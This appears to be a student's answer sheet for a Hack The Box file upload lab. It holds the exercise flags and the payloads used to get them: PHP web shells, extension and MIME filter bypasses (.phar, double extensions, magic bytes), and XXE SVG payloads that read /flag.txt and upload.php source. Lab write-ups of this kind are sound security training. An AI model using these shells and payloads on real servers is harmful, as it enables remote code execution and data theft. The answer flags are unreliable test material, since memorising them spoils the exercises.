# Absent Validation

Answer: ng-611037-fileuploadsabsentverification-odcf1-7ffff4886c-xtz5l 

Explanation: By uploading the file 'shell.php' containing the php command: "<?php system("hostname"); ?>". 
Then go the directory: http://<IP:PORT>/uploads/shell.php to view the output of the command run by the back-end web-server.

# Upload Exploitation

Answer: HTB{g07_my_f1r57_w3b_5h3ll} 

Explanation: Now the webshell.php is uploaded with a content written there: "<?php system($_REQUEST['cmd']); ?>"
To use the webshell, go to the following: http://<IP:PORT>/uploads/webshell.php?cmd=cat /flag.txt

# Client-Side Validation 

Answer: HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}

Explanation: The same shell.php is going  to be uploaded. For this, delete the mentioned functions:

""" <!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Employee File Manager</title>
  <link rel="stylesheet" href="./style.css">
</head>

 <body>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
  <script src="./script.js"></script>
  <div>
    <h1>Update your profile image</h1>
    <center>
      <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onSubmit="if(validate()){upload()}">
        <input type="file" name="uploadFile" id="uploadFile" onChange="showImage()" accept=".jpg,.jpeg,.png">
        <img src='/profile_images/shell.php' class='profile-image' id='profile-image'>
        <input type="submit" value="Upload" id="submit">
      </form>
      <br>
      <h2 id="error_message"></h2>
    </center>
  </div>
</body>

</html> """  to:

 """ <!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Employee File Manager</title>
  <link rel="stylesheet" href="./style.css">
</head>

<body>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
  <script src="./script.js"></script>
  <div>
    <h1>Update your profile image</h1>
    <center>
      <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onSubmit="{upload()}">
        <input type="file" name="uploadFile" id="uploadFile" onChange="" accept="">
        <img src='/profile_images/shell.php' class='profile-image' id='profile-image'>
        <input type="submit" value="Upload" id="submit">
      </form>
      <br>
      <h2 id="error_message"></h2>
    </center>
  </div>
</body>

</html> """

# Blacklist Filters

Answer: HTB{1_c4n_n3v3r_b3_bl4ckl1573d}

Explanation: The extension '.php' is blacklisted, so try the list of other using from PayloadsAllTheThings within Intruder. However the answers with success were several, the '.phar' is only worked. It supposed that the web-server only understands this as executable php program. So, the file shell.phar containing the following: '<?php system($_REQUEST['cmd']); ?>' will work as a web shell. 

View the flag by the path: http://<IP:PORT>/profile_images/cat.phar?cmd=cat%20/flag.txt

# Whitelist Filters

Answer: HTB{1_wh173l157_my53lf}

Explanation: Clean the function on front-end. Then, use the upload function with a file 'shell.phar.jpg'

View: http://<IP:PORT>/profile_images/shell.phar.jpg?cmd=cat%20/flag.txt

# Type Filters

Answer: HTB{m461c4l_c0n73n7_3xpl0174710n}

Explanation: Clean the function on front-end. Then, use the upload function with a file 'shell.jpg.phtml' and add GIF8 chunk to the content of the file

View: http://<IP:PORT>/profile_images/shell.jpg.phtml?cmd=cat%20/flag.txt

# Limited File Uploads

1. The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"

Answer: HTB{my_1m4635_4r3_l37h4l}

Explanation: 

Content-Disposition: form-data; name="uploadFile"; filename="cat.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>

The flag could be seen in Inspection of a page

2. Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)

Answer: ./images/

Explanation: Payload: 
Content-Disposition: form-data; name="uploadFile"; filename="cat.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>

Decode Base64: PD9waHAKJHRhcmdldF9kaXIgPSAiLi9pbWFnZXMvIjsKJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1sidXBsb2FkRmlsZSJdWyJuYW1lIl0pOwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuICRmaWxlTmFtZTsKJGNvbnRlbnRUeXBlID0gJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0eXBlJ107CiRNSU1FdHlwZSA9IG1pbWVfY29udGVudF90eXBlKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsndG1wX25hbWUnXSk7CgppZiAoIXByZWdfbWF0Y2goJy9eLipcLnN2ZyQvJywgJGZpbGVOYW1lKSkgewogICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9Cgpmb3JlYWNoIChhcnJheSgkY29udGVudFR5cGUsICRNSU1FdHlwZSkgYXMgJHR5cGUpIHsKICAgIGlmICghaW5fYXJyYXkoJHR5cGUsIGFycmF5KCdpbWFnZS9zdmcreG1sJykpKSB7CiAgICAgICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgICAgICBkaWUoKTsKICAgIH0KfQoKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICRsYXRlc3QgPSBmb3BlbigkdGFyZ2V0X2RpciAuICJsYXRlc3QueG1sIiwgInciKTsKICAgIGZ3cml0ZSgkbGF0ZXN0LCBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSkpOwogICAgZmNsb3NlKCRsYXRlc3QpOwogICAgZWNobyAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQiOwp9IGVsc2UgewogICAgZWNobyAiRmlsZSBmYWlsZWQgdG8gdXBsb2FkIjsKfQo=

Decoded:
<?php
$target_dir = "./images/";
$fileName = basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!preg_match('/^.*\.svg$/', $fileName)) {
    echo "Only SVG images are allowed";
    die();
}

foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/svg+xml'))) {
        echo "Only SVG images are allowed";
        die();
    }
}

if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    $latest = fopen($target_dir . "latest.xml", "w");
    fwrite($latest, basename($_FILES["uploadFile"]["name"]));
    fclose($latest);
    echo "File successfully uploaded";
} else {
    echo "File failed to upload";
}

# Skill Assessment (in Progress...)

Answer: HTB{m4573r1ng_upl04d_3xpl0174710n}

This is the view of upload.php:

<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}

This is the POST of /contact/upload.php:

Content-Disposition: form-data; name="uploadFile"; filename="3.phar.jpg"
Content-Type: image/png

ÿØÿÛ
<?php system($_REQUEST['cmd']); ?>

The path:
http://<IP:PORT>/contact//user_feedback_submissions/250121_3.phar.jpg?cmd=id

The path for an answer:
http://<IP:PORT>/contact//user_feedback_submissions/250121_3.phar.jpg?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt